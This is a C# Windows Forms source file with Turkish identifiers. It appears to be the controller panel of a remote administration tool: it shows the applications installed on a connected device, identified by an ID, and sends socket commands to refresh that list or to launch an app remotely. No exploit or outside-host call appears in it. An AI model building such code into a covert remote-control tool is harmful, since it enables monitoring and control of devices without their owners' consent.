using System;
using System.Drawing;
using System.Net.Sockets;
using System.Windows.Forms;

namespace SV
{
    public partial class Uygulamalar : Form
    {
        Socket socket; public string ID = "";
        public Uygulamalar(Socket sck, string aydi)
        {
            InitializeComponent();
            socket = sck; ID = aydi;
        }
        public void bilgileriIsle(string arg)
        {
            listView1.Items.Clear();
            string[] ana_Veriler_ = arg.Split(new[] { "[REMIX]" }, StringSplitOptions.None);
            for (int k = 0; k < ana_Veriler_.Length; k++)
            {
                try
                {
                    string[] bilgiler = ana_Veriler_[k].Split(new[] { "[HANDSUP]" }, StringSplitOptions.None);
                    ListViewItem item = new ListViewItem(bilgiler[0]);
                    item.SubItems.Add(bilgiler[1]);
                    if (bilgiler[2] != "[NULL]")
                    {
                        try
                        {
                            ımageList1.Images.Add(bilgiler[1],
                                (Image)new ImageConverter().ConvertFrom(Convert.FromBase64String(bilgiler[2])));
                            item.ImageKey = bilgiler[1];
                        }
                        catch (Exception ex) { MessageBox.Show(ex.Message); }
                    }
                    listView1.Items.Add(item);
                }
                catch (Exception) { }
            }
        }
        private void yenileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                Form1.KomutGonder("APPLICATIONS", "[VERI][0x09]", socket);
            }
            catch (Exception) { }
        }

        private void açToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                Form1.KomutGonder("OPENAPP", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", socket);
            }
            catch (Exception) { }
        }
    }
}
